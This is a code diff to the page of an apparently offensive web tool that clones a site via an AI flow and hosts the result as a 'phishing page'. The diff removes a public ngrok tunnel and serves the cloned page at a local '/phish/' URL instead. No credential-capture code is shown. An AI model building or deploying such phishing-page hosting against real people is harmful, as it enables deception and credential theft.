@@ -19,7 +19,6 @@ import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '
 import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import { Textarea } from '@/components/ui/textarea';
 import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
-import { startNgrokTunnel } from '@/services/ngrok-service';
 
 const clonerSchema = z.object({
   redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
@@ -220,18 +219,14 @@ export default function PhishingPage() {
     setHostedUrl(null);
 
     try {
-      toast({ title: "Generating Public Link...", description: "Starting ngrok tunnel. This may take a moment." });
-      
-      const url = await startNgrokTunnel();
-
       const pageId = generateUUID();
       const pageStorageKey = `phishing-html-${pageId}`;
       localStorage.setItem(pageStorageKey, modifiedHtml);
       
-      const finalUrl = url + '/phish/' + pageId;
+      const finalUrl = new URL(`/phish/${pageId}`, window.location.origin).toString();
       setHostedUrl(finalUrl);
       
-      toast({ title: "Public Link Generated!", description: "Your phishing page is accessible via ngrok." });
+      toast({ title: "Public Link Generated!", description: "Your phishing page is now accessible locally." });
       
       const urlToClone = form.getValues('urlToClone');
       logActivity({
@@ -339,7 +334,7 @@ export default function PhishingPage() {
                         <div className="w-full flex gap-2">
                         <Button type="button" onClick={handleGenerateLink} disabled={isProcessing || isHosting} className="w-full">
                            {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
-                           Generate Public Link (ngrok)
+                           Generate Public Link
                         </Button>
                         <Button type="button" variant="secondary" onClick={handleCopyHtml}>
                             <Clipboard className="mr-2 h-4 w-4" />
